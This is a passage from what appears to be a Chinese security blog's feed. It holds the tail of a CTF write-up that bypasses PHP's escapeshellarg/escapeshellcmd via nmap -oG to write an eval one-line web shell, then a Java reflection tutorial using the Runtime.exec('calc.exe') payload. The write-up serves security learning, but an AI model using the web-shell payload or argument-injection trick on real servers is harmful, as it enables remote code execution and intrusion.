delimiter">?></span> <span class="token operator">-</span>oN <span class="token number">1</span><span class="token punctuation">.</span>phtml</code></pre><p><img src="/Blogimages/3/9.png"><br>回显是这个，但是我们访问1.phtml，发现并没有生成，是函数<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong>在作怪。</p><h3 id="如何绕过escapeshellarg和escapeshellcmd"><a href="#如何绕过escapeshellarg和escapeshellcmd" class="headerlink" title="如何绕过escapeshellarg和escapeshellcmd"></a>如何绕过<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong></h3><p>要了解如何绕过，那就得先了解一下这两个函数的分别作用<br><a href="/Blogimages/3/10.png"></a></p><p><img src="/Blogimages/3/11.png"><br>看了描述之后再看一下这两个函数的例子：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"' &lt;?= @eval(\$_REQUEST[1]);?> -oG test.phtml '"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"escapeshellarg:"</span><span class="token punctuation">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"escapeshellcmd:"</span><span class="token punctuation">.</span><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span></code></pre><p>输出</p><pre class=" language-php"><code class="language-php">escapeshellarg<span class="token punctuation">:</span><span class="token string">''</span>\<span class="token package"><span class="token punctuation">\</span></span><span class="token string">''</span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token operator">-</span>oG test<span class="token punctuation">.</span>phtml<span class="token string">'\\'</span><span class="token string">''</span>escapeshellcmd<span class="token punctuation">:</span><span class="token string">''</span>\<span class="token package"><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span></span><span class="token string">''</span>\<span class="token markup">&lt;\\?= @eval\\(\\$_REQUEST\\[1\\]\\)\\;\\?\\></span> <span class="token operator">-</span>oG test<span class="token punctuation">.</span>phtml<span class="token string">'\\\\'</span><span class="token string">''</span></code></pre><p>如果我们把两个函数处理过的字符串直接用nmap尝试写入文件能成功吗<br><img src="/Blogimages/3/12.png"><br>很显然，答案是可行的如此一来便绕过了<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong></p><p>接下来就是连接木马巴拉巴拉<br><img src="/Blogimages/3/13.png"></p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>exp：</p><p><code> &#39; &lt;?= @eval($_REQUEST[1]);?&gt; -oG test.phtml &#39;</code></p><p>这个<strong>引号</strong>和 <strong>&lt;</strong> 之间要记得留空格，否则 <strong>&lt;</strong> 会被转义，一句话木马就失效了</p><h2 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h2><p>本来其实是不知道对 <strong>[</strong> <strong>]</strong> <strong>?</strong> 等符号也进行转义之后因为 nmap 写入文件恰好需要那些转义才刚好写进去。自己研究了这么久才意外发现也是很惊喜，之前对namp不甚了解的时候做过[2018BUUCTF]类似的题型，没有完全了解，今天<strong>查阅很多资料+实践</strong>才发现这些奥秘的，希望对你也有帮助。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a> &#x3D;&gt; PHP escapeshellarg()+escapeshellcmd() 之殇</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java安全--篇1-反射</title>
      <link href="/2022/11/13/Java%E5%AE%89%E5%85%A8--%E7%AF%871-%E5%8F%8D%E5%B0%84/"/>
      <url>/2022/11/13/Java%E5%AE%89%E5%85%A8--%E7%AF%871-%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="Java安全–篇1-反射"><a href="#Java安全–篇1-反射" class="headerlink" title="Java安全–篇1-反射"></a>Java安全–篇1-反射</h1><h3 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h3><p>看了好多文章，一直没搞懂反射是什么，然后闲着无聊搜了视频，一看就懂了好多，这里浅说一下。很多顺序是跟着P神的文章走的，把自己看不懂的百度出来记录一下。</p><h4 id="0x01之前的关注点"><a href="#0x01之前的关注点" class="headerlink" title="0x01之前的关注点"></a>0x01之前的关注点</h4><p>之前我们关注类都是关心他的构造方法，属性，方法。更多的是关注实例化出来的对象，可以调用什么属性，什么方法。如下图所示：</p><p><img src="/Blogimages/Java%E5%AE%89%E5%85%A8--%E7%AF%871-%E5%8F%8D%E5%B0%84/93557b08271ecdd1c9e70fb8bc0d34b1-20231017082442-rpcaia4.png">​</p><p>我们都知道，类是用来描述一组对象，类实例化之后就是一个对象。</p><p>类是对象的模板，而对象是类的实例化。</p><blockquote><p>引出第一句话：</p><p>对象可以通过反射获取他的类</p></blockquote><p>而这个深灰色所包括的三个对象是同一个类实例化出来的，他们的模板都很像，那对象是这样，属性是否也是这样呢？</p><h4 id="0x02把目光聚集在所有类上"><a href="#0x02把目光聚集在所有类上" class="headerlink" title="0x02把目光聚集在所有类上"></a>0x02把目光聚集在所有类上</h4><p>现在把目光上升一层，之前关注的是对象，现在把这个灰色框框移到类上：</p><p><img src="/Blogimages/Java%E5%AE%89%E5%85%A8--%E7%AF%871-%E5%8F%8D%E5%B0%84/cb27dea94d8701c07251939c90206e63-20231017082442-azoqr0d.png">​</p><p>这三个类都可能有属性，都可能有方法，都可能有构造方法。不管有没有，只要他们有的话，肯定长得很像。</p><p>那有没有一种方法可以去描述这个<a href="https://so.csdn.net/so/search?q=%E7%B1%BB%E6%A8%A1%E6%9D%BF&spm=1001.2101.3001.7020">类模板</a>？类是描述对象的，那有没有什么是描述类的呢？</p><blockquote><p><strong>这就是所谓的反射技术</strong></p></blockquote><p><a href="https://so.csdn.net/so/search?q=Class%E7%B1%BB&spm=1001.2101.3001.7020">Class类</a>型的类模板，可以描述类模板。这个关系不就是类和对象的关系吗，只不过是上升了一层。</p><p><img src="/Blogimages/Java%E5%AE%89%E5%85%A8--%E7%AF%871-%E5%8F%8D%E5%B0%84/3d63236f13669722a83c3d3ed31159d1-20231017082442-sdnt1u7.png">​</p><blockquote><p>引出第二句话：</p><p><strong>类可以通过反射拿到Class类型的类模板</strong></p></blockquote><p>这里记住Class类型的类模板肚子里的三个东西，是下面反射时访问成员方法、变量、构造方法的关键字：</p><blockquote><p><strong>1.Field</strong></p><p><strong>2.Method</strong></p><p><strong>3.Constructor</strong></p></blockquote><h4 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h4><p>因此可以通过这个Class类型的类模板得到任意一个class对象，也就可以得到任意一个对象了。</p><p>那么反射就是反过来，你可以通过对象去反射得到他的类，又可以通过类反射得到Class类型的类模板，因此P神的文章有这么一句话：</p><blockquote><p>对象可以通过反射获取他的类，类可以通过反射拿到所有 ⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态 特性。 –P神</p></blockquote><h4 id="0x04操作语法："><a href="#0x04操作语法：" class="headerlink" title="0x04操作语法："></a>0x04操作语法：</h4><blockquote><p>获取运行时类Class：</p><p>Class clazz &#x3D; 类名.class;</p><p>Class clazz &#x3D; 对象应用.getClass();</p><p>Class clazz &#x3D; Class.forName(“包名.类名”);</p></blockquote><blockquote><p>1.分析类的结构（修饰符，类名，继承的父类，实现的父接口）</p></blockquote><blockquote><p>2.反射创建对象</p><p>类中默认无参数构造方法，执行创建 newInstance();</p><p>找到某一个构造方法，执行创建</p></blockquote><blockquote><p>3.获取类中的成员</p><p>3.1获取属性 clazz.getField(“属性名”);</p><p>分析属性的结构(修饰符，属性类型，属性名，注解)</p><p>存取信息 set()&#x2F;get()</p><p>3.2获取方法 clazz.getMethod(“方法名”，参数类型….);</p><p>分析方法的结构（修饰符，返回类型，方法名，参数类型，异常类型，注解）</p><p>执行方法 invoke()</p><p>3.3获取构造方法 clazz.getConstructor(参数类型…);</p><p>分析构造方法的结构（修饰符，参数类型，异常类型，注解）</p><p>执行构造方法 newInstance();</p></blockquote><h4 id="0x05实操加深理解"><a href="#0x05实操加深理解" class="headerlink" title="0x05实操加深理解"></a>0x05实操加深理解</h4><p>1.新建一个包，随便命名，我这里命名为：MyselfTest</p><p>2.在MyselfTest包下创建一个学生类：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> MyselfTest<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span><span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token function">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"默认无参构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*    * 有加public和没加public的区别：    *   1.加了public代表赋予公共权限    *   2.没加默认是private    *   3.同一个包下面可以任意调用，不在乎调用权限    * */</span><span class="token keyword">public</span> <span class="token function">Student</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行了name的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行了age的私有构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>3.获取类名</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> MyselfTest<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">reflect</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>Student stu1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*        * 获取类名三方式        * Class clazz = 类名.class;        * Class clazz = 对象应用.getClass();        * Class clazz = Class.forName("包名.类名");        * */</span><span class="token comment" spellcheck="true">//方法一</span>Class <span class="token class-name">stu1Class</span> <span class="token operator">=</span> Student<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stu1Class<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//方法二</span>Class <span class="token class-name">stu2Class</span> <span class="token operator">=</span> stu1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stu2Class<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//方法三</span><span class="token keyword">try</span> <span class="token punctuation">{</span>Class <span class="token class-name">stu3Class</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//注意此字符串必须是真实路径，就是带包名的类路径，包名.类名</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stu3Class<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>运行结果：</p><p>默认无参构造方法</p><p>class MyselfTest.Student</p><p>class MyselfTest.Student</p><p>class MyselfTest.Student</p></blockquote><p><em><strong>这里方法三最常用，能记住就记住！</strong></em></p><p><em><strong>这里方法三最常用，能记住就记住！</strong></em></p><p><em><strong>这里方法三最常用，能记住就记住！</strong></em></p><p>4.调用构造方法</p><blockquote><p>4.1.获取构造方法：</p><p>clazz.getConstructors(); 获取所有构造方法</p><p>如果想要获取私有需要加上Declared，即：</p><p>get<strong>Declared</strong>Constructors()：获取所有的构造方法(包括私有、受保护、默认、公有)</p><p>这里getConstructor(Class… parameterTypes)得到的是Constructor类型的多个方法，需要用Constructor类型的数组变量去接：(示例)</p><p><strong>Constructor[] con &#x3D; clazz.getConstructor(int.class);</strong></p></blockquote><blockquote><p>4.2.获取单个构造方法并调用</p><p>getConstructor(Class… parameterTypes):获取单个的”公有的”构造方法：</p><p>getDeclaredConstructor(Class… parameterTypes):获取”某个构造方法”可以是私有的，或受保护、默认、公有；</p><p>这里getConstructor(Class… parameterTypes)得到的是Constructor类型的单个方法，需要用Constructor类型的变量去接：（示例）</p><p><strong>Constructor con &#x3D; clazz.getConstructor(int.class);</strong></p></blockquote><blockquote><p>4.3.newInstance</p><p>通过 Class 类（new类的不行）的 newInstance() 方法创建对象，该方法要求该 Class 对应类有无参<a href="https://so.csdn.net/so/search?q=%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95&spm=1001.2101.3001.7020" title="构造方法">构造方法</a>。</p><p>执行 newInstance()方法实际上就是使用对应类的无参构造方法来创建该类的实例</p><p>其代码的作用等价于Super sup &#x3D; new Super()</p></blockquote><blockquote><p>如果newlnstance执行不成功，有两个原因：</p><p>1.该类没有无参数的构造方法</p><p>2.使用的类构造函数是私有的</p></blockquote><p>4.4. invoke</p><blockquote><p>invoke的普通用法：</p><pre><code>Class&lt;?&gt; clazz3 = Class.forName(&quot;MyselfTest.Student&quot;);clazz3.getMethod(&quot;function&quot;).invoke(clazz3);</code></pre></blockquote><p><strong>关于invoke这里还有一个注意点：</strong></p><blockquote><p>invoke 的作用是执行方法，它的第一个参数是：</p><ol><li>如果这个方法是一个普通方法，那么第一个参数是类对象</li><li>如果这个方法是一个静态方法，那么第一个参数是类</li></ol></blockquote><blockquote><p>invoke用于调用方法，p神这里是这样调用的：</p><pre><code>Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;,String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc.exe&quot;);//这里有个让我很疑惑的点，这里invoke是怎么成功调用方法的</code></pre></blockquote><blockquote><p>正常来说应该是这样：</p><pre><code>Class clazz0 = Class.forName(&quot;java.lang.Runtime&quot;);clazz0.getMethod(&quot;exec&quot;, String.class).invoke(clazz0.newInstance(), &quot;calc.exe&quot;);</code></pre></blockquote><p>但是会报错：</p><p><img src="/Blogimages/Java%E5%AE%89%E5%85%A8--%E7%AF%871-%E5%8F%8D%E5%B0%84/2151a1168357a03d846720611c19fa6a-20231017082442-p93pjal.png">​</p><p>“ <em><strong>原因是 Runtime 类的构造方法是私有的。 有同学就比较好奇，为什么会有类的构造方法是私有的，难道他不想让用户使用这个类吗？这其实涉及 到很常见的设计模式：“单例模式”。（有时候工厂模式也会写成类似） 比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取</strong></em> “</p><p>给了一个连接数据库的例子：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrainDB</span> <span class="token punctuation">{</span><span class="token keyword">private</span> <span class="token keyword">static</span> TrainDB instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrainDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> TrainDB <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> instance<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token function">TrainDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 建立连接的代码...</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*上面payload的中invoke后面的内容：    invoke(clazz.getMethod("getRuntime").invoke(clazz),"calc.exe")这其中的clazz.getMethod("getRuntime").invoke(clazz)就是获取形如instance的东西*/</span></code></pre><blockquote><p>于是有了这个payload：</p><pre><code>Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;,String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc.exe&quot;);//getMethod还没有讲，下面再提</code></pre></blockquote><p>分解开来就是这样：</p><blockquote><pre><code>Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);Object runtime = getRuntimeMethod.invoke(clazz);execMethod.invoke(runtime, &quot;calc.exe&quot;);</code></pre></blockquote><p>4.5.获取成员构造方法并调用</p><pre class=" language-java"><code class="language-java">​结果：<span class="token number">5</span><span class="token punctuation">.</span>获取属性clazz1<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*Student类里面的：public class Student {    private int age;    public String name; // 变量也可以设置其访问类型    public char school;    char sex;    private String phoneNum;}*/</span><span class="token keyword">package</span> MyselfTest<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">getMethod</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>Class <span class="token class-name">clazz1</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> publicPart1 <span class="token operator">=</span> clazz1<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>Field p <span class="token operator">:</span> publicPart1<span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"多个方法：（public）"</span><span class="token operator">+</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>Class <span class="token class-name">clazz2</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> publicPart2 <span class="token operator">=</span> clazz2<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>Field p<span class="token operator">:</span>publicPart2<span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"多个方法：（all）"</span><span class="token operator">+</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>Class <span class="token class-name">clazz3</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field publicPart3 <span class="token operator">=</span> clazz3<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"school"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"单个方法："</span><span class="token operator">+</span>publicPart3<span class="token punctuation">)</span><span class="token punctuation">;</span>Class <span class="token class-name">clazz4</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Field publicPart4 <span class="token operator">=</span> clazz4<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"phoneNum"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"单个私有："</span><span class="token operator">+</span>publicPart4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>​</code></pre><p>结果:</p><p><img src="/Blogimages/Java%E5%AE%89%E5%85%A8--%E7%AF%871-%E5%8F%8D%E5%B0%84/bb729f7f6fa6fe28345e5a518c5b2337-20231017082442-uui3q6p.png">​</p><p>6.获取方法</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*使用到的方法：public void function(){        System.out.println("public void function");    }    static void function1(){        System.out.println("static void function");    }    public void function2(int age){        System.out.println("(void public)Age:"+age);    }    static void function3(String school){        System.out.println("(private void)School:"+school);    }*/</span><span class="token keyword">package</span> MyselfTest<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">getMethod</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">,</span> InstantiationException <span class="token punctuation">{</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz1 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Method method1 <span class="token operator">=</span> clazz1<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//function()是public</span>        method1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz1<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 这里一定要newInstance()</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz2 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Method method2 <span class="token operator">=</span> clazz2<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"function1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//function1()是static</span>        method2<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz2<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz3 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Method method3 <span class="token operator">=</span> clazz3<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"function2"</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method3<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz3<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz4 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"MyselfTest.Student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Method method4 <span class="token operator">=</span> clazz4<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"function3"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method4<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz4<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"FJPSC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>结果：</code></pre><p><img src="/Blogimages/Java%E5%AE%89%E5%85%A8--%E7%AF%871-%E5%8F%8D%E5%B0%84/1dba75fb44142179000030eefdc46947-20231017082442-fdhsjfq.png">​</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/sinat_38259539/article/details/71799078" title="Java基础之—反射（非常重要）_敬业小码哥的博客-CSDN博客_java反射">Java基础之—反射（非常重要）_敬业小码哥的博客-CSDN博客_java反射</a></p><p><a href="https://blog.csdn.net/qq_43796994/article/details/119113651" title="newInstance() 方法_LiLiYuan.的博客-CSDN博客_newinstance">newInstance() 方法_LiLiYuan.的博客-CSDN博客_newinstance</a></p><p><a href="https://govuln.com/docs/java-things/" title="Java安全漫谈 - 『代码审计』知识星球">Java安全漫谈 - 『代码审计』知识星球</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021 蓝帽杯 One Pointer PHP</title>
      <link href="/2022/08/31/2021_%E8%93%9D%E5%B8%BD%E6%9D%AFOne%20Pointer%20PHP/"/>
      <url>/2022/08/31/2021_%E8%93%9D%E5%B8%BD%E6%9D%AFOne%20Pointer%20PHP/</url>
      
